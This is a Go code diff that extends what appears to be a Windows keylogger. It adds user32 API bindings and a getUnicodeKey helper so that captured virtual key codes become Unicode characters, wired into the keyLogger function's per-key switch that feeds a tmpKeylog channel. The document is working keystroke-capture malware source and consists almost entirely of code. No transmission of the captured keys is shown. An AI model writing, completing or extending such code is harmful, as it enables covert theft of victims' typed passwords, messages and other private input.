@@ -20,6 +20,9 @@ var (
 	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
 	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
 	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
+	procGetKeyboardState         = user32.NewProc("GetKeyboardState")
+	procMapVirtualKey            = user32.NewProc("MapVirtualKeyA")
+	procToUnicodeEx              = user32.NewProc("ToUnicodeEx")
 
 	tmpTitle string
 )
@@ -35,6 +38,47 @@ func getForegroundWindow() (hwnd syscall.Handle, err error) {
 		return
 	}
 	hwnd = syscall.Handle(r0)
+	return
+}
+
+func getKeyboardState(keyboardState *uint16) (len int32, err error) {
+	r0, _, e1 := syscall.Syscall(procGetKeyboardState.Addr(), 1, uintptr(unsafe.Pointer(keyboardState)), 0, 0)
+	len = int32(r0)
+
+	if len == 0 {
+		if e1 != 0 {
+			err = error(e1)
+		} else {
+			err = syscall.EINVAL
+		}
+	}
+	return
+}
+
+func mapVirtualKey(uCode syscall.Handle) (scanCode syscall.Handle, err error) {
+	r0, _, e1 := syscall.Syscall(procMapVirtualKey.Addr(), 2, uintptr(uCode), 0, 0)
+
+	if e1 != 0 {
+		err = error(e1)
+		return
+	}
+	scanCode = syscall.Handle(r0)
+	return
+}
+
+func toUnicodeEx(virtKey syscall.Handle, scanCode syscall.Handle, keyState *uint16, pwszBuff *uint16) (value syscall.Handle) {
+	r0, _, _ := syscall.Syscall6(
+		procToUnicodeEx.Addr(),
+		6,
+		uintptr(virtKey),
+		uintptr(scanCode),
+		uintptr(unsafe.Pointer(keyState)),
+		uintptr(unsafe.Pointer(pwszBuff)),
+		1,
+		0,
+	)
+
+	value = syscall.Handle(r0)
 	return
 }
 
@@ -124,6 +168,25 @@ func getLanguage() {
 		fmt.Printf("Language: %v \r\n", constants.RU)
 		break
 	}
+}
+
+func getUnicodeKey(virtualCode syscall.Handle) {
+	keyboardBuf := make([]uint16, 200)
+	_, getKeyboardStateErr := getKeyboardState(&keyboardBuf[0])
+	if getKeyboardStateErr != nil {
+		log.Fatalf("getKeyboardState -> %v", getKeyboardStateErr)
+	}
+
+	scanCode, mapVirtualKeyErr := mapVirtualKey(virtualCode)
+	if mapVirtualKeyErr != nil {
+		log.Fatalf("mapVirtualKey -> %v", mapVirtualKeyErr)
+	}
+
+	unicodeBuf := make([]uint16, 200)
+	state := toUnicodeEx(virtualCode, scanCode, &keyboardBuf[0], &unicodeBuf[0])
+	fmt.Println("KEY BUFF ", keyboardBuf)
+	fmt.Println("SCAN CODE ", scanCode)
+	fmt.Println("UNICODE ", state, unicodeBuf)
 }
 
 func keyLogger() {
@@ -480,6 +543,7 @@ func keyLogger() {
 				break
 			case 0x5A:
 				getLanguage()
+				getUnicodeKey(0x5A)
 				tmpKeylog <- "z"
 				break
 			}
